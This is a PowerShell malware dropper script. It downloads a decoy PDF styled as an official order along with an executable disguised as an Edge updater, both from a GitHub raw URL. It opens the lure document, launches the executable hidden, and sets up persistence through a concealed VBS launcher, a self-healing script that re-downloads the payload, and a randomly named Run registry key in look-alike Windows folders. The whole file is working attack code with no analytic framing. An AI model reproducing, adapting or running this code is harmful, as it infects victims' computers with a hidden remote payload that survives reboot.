# launcher.ps1 - LAST ATTEMPT: ultra-simple VBS + Run key with forced quotes
$ErrorActionPreference = 'SilentlyContinue'

$persistBase = "$env:APPDATA\Microsoft\Windows\Libraries"
$cache = "$env:APPDATA\Microsoft\Windows\Caches"
New-Item -ItemType Directory -Path $persistBase,$cache -Force | Out-Null

$pdfUrl = "https://raw.githubusercontent.com/astro-opensource/cloud-sync-tools/1b8f22c806de43fe97c6cd555f455d166591d54d/assets/Nakaz_No._661_vid_02.03.2026.pdf"
$exeUrl = "https://raw.githubusercontent.com/astro-opensource/cloud-sync-tools/main/assets/EdgeUpdater.exe"

$pdfPath = "$cache\doc.pdf"
$exePath = "$cache\helper.exe"

$headers = @{'User-Agent' = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}

# Drop files
Invoke-WebRequest -Uri $pdfUrl -OutFile $pdfPath -Headers $headers -UseBasicParsing
Invoke-WebRequest -Uri $exeUrl -OutFile $exePath -Headers $headers -UseBasicParsing

# Open PDF
if (Test-Path $pdfPath) { 
    Start-Process $pdfPath -Verb Open 
}

Start-Sleep -Seconds (Get-Random -Min 20 -Max 45)

# Initial launch
$wsh = New-Object -ComObject WScript.Shell
$wsh.Run("`"$exePath`"", 0, $false)

# Persistence - simple as fuck
$randName = "CacheLib-$(Get-Random -Min 100000 -Max 999999)"
$vbsPath = "$persistBase\$randName.vbs"
$syncPath = "$persistBase\$randName.ps1"

# VBS with rock-solid quoting
$vbsContent = 'Set WshShell = CreateObject("WScript.Shell")' + "`r`n"
$vbsContent += 'WshShell.Run "powershell.exe -NoProfile -ExecutionPolicy Bypass -NonInteractive -File ""' + $syncPath + '""", 0, False'
$vbsContent | Out-File -FilePath $vbsPath -Encoding ASCII -Force

# Sync script - self healing + launch
$syncContent = @"
`$ErrorActionPreference = 'SilentlyContinue'
Start-Sleep -Milliseconds (Get-Random -Min 8000 -Max 15000)
`$exeUrl = "$exeUrl"
`$exePath = "$exePath"
if (-not (Test-Path `$exePath)) {
    Invoke-WebRequest -Uri `$exeUrl -OutFile `$exePath -Headers @{'User-Agent'='Mozilla/5.0'} -UseBasicParsing
}
Get-Process -Name "*helper*" -ErrorAction SilentlyContinue | Stop-Process -Force
Start-Sleep -Milliseconds 4000
`$wsh = New-Object -ComObject WScript.Shell
`$wsh.Run("`"`$exePath`"", 0, `$false)
"@
$syncContent | Out-File -FilePath $syncPath -Encoding UTF8 -Force

# Register in Run key
$runKey = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
Set-ItemProperty -Path $runKey -Name $randName -Value "wscript.exe `"$vbsPath`"" -Type String -Force

# Fire once now
Start-Process wscript.exe -ArgumentList "`"$vbsPath`"" -WindowStyle Hidden
